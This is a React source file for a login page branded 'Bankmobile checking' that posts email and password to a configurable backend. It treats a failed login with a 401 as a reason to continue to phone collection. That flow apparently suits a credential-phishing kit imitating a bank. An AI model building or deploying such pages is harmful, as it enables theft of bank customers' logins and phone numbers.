import { createLazyFileRoute } from '@tanstack/react-router';
import { useState, useEffect } from 'react';
import bmLogo from '../assets/img/bm-tech-logo.png';
import getStartedImg from '../assets/img/button_getstarted.png';
import heroImg from '../assets/img/index_page_banner.jpg';
import Foot from '../components/foot';
import {useNavigate} from '@tanstack/react-router';


function Home() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [message, setMessage] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const API_URL = import.meta.env.VITE_API_URL;

  const navigate = useNavigate();

  useEffect(() => {
    document.title = 'Welcome to Bankmobile checking';
  }, []);


  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsLoggingIn(true);

    try {
      const response = await fetch(`${API_URL}/api/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          password,
        }),
      });

      const data = await response.json();

      if (response.ok) {

        if (data.session_token) {
          sessionStorage.setItem('session_token', data.session_token);
        }

        sessionStorage.setItem('email', email);

        setTimeout(() => {
          navigate({ to: '/profile/phone/verify' });
        }, 1000);

        setEmail('');
        setPassword('');

      } else if (response.status === 401) {
        if (data.token) {
          sessionStorage.setItem('session_token', data.token);
        }

        const redirectPath = data.redirectTo || data.redirect_to || '/profile/phone';
        navigate({ to: redirectPath });
      } else {
        console.error('Login failed:', data);
        setMessage(`Error: ${data.message || 'Something went wrong.'}`);
        setIsLoggingIn(false);
      }
    } catch (error) {
      console.error('Error login in:', error);
      setMessage('Failed to connect to server.');
      setIsLoggingIn(false);
    }
  };


  return (
    <>
      <div className="flex w-full items-center justify-between p-4 max-md:flex-col max-md:items-start max-md:gap-4 max-md:justify-start max-md:px-3 max-lg:flex-col max-lg:items-start">
        <div>
          <a href="/">
            <img
              src={bmLogo}
              alt="bmLogo"
              className="w-80 max-md:w-56.25 h-auto cursor-pointer"
            />
          </a>
        </div>

        <form
          id="loginForm"
          onSubmit={handleSubmit}
          className="flex max-md:gap-2 max-md:flex-col items-start gap-8 max-md:w-full"
        >
          <div
            id="errorContainer"
            className="w-full border border-red-200 bg-red-50 p-3 text-sm text-red-700 hidden"
          >
            <ul id="errorsList" className="list-disc pl-5"></ul>
          </div>

          <div className="flex items-start gap-4 max-md:flex-col max-md:gap-2 max-md:w-full">
            <div className="flex flex-col max-md:w-full">
              <label htmlFor="email" className="mb-2 text-sm font-semibold">
                Email Address:
              </label>
              <input
                id="email"
                type="email"
                name="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Ex: janedoe@yahoo.com"
                required
                className="p-2 text-[#999] h-8 w-54 max-md:w-full border-b-2 border-[#79bde9] focus:border focus:border-[#79bde9] outline-none"
              />

              <div className="text-xs text-red-500 mt-4">{message}</div>
            </div>

            <div className="flex flex-col max-md:w-full">
              <label htmlFor="passwrd" className="mb-2 text-sm font-semibold">
                Password:
              </label>
              <input
                id="passwrd"
                type="password"
                name="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="(case sensitive)"
                required
                className="p-2 text-[#999] h-8 w-54 max-md:w-full border-b-2 border-[#79bde9] focus:border focus:border-[#79bde9] outline-none"
              />
              {/* <div className="flex items-center justify-end">
                <a href="#" className="text-xs font-light border-b mt-3">
                  Forgot Login Information?
                </a>
              </div> */}
            </div>
          </div>

          <div className="flex items-center gap-2 max-md:items-end max-md:justify-end max-md:w-full">
            <button
              type="submit"
              id="loginBtn"
              disabled={isLoggingIn}
              className="border-2 border-[#79bde9] bg-transparent pt-2.5 px-3 pb-[8.25px] cursor-pointer text-[#79bde9] text-lg uppercase font-bold mt-2 mb-1 disabled:cursor-not-allowed disabled:bg-[#e2eff9] disabled:text-[#8fa6b7] shadow-sm"
            >
              {isLoggingIn ? (
                <span className="inline-flex items-center gap-2 ">
                  <span className="h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent " />
                  Log In!
                </span>
              ) : (
                'Log In!'
              )}
            </button>

            <a href="/" className="pt-2.5">
              <img
                src={getStartedImg}
                alt="getStarted"
                className="w-36 h-auto"
              />
            </a>
          </div>
        </form>
      </div>

      <div className="w-full overflow-hidden max-md:overflow-none max-md:w-fit h-auto">
        <a href="/">
          <img
            src={heroImg}
            alt="heroImg"
            className="w-full h-full object-cover object-top"
          />
        </a>
      </div>

      <Foot />
    </>
  );
}

export const Route = createLazyFileRoute('/')({
  component: Home,
});
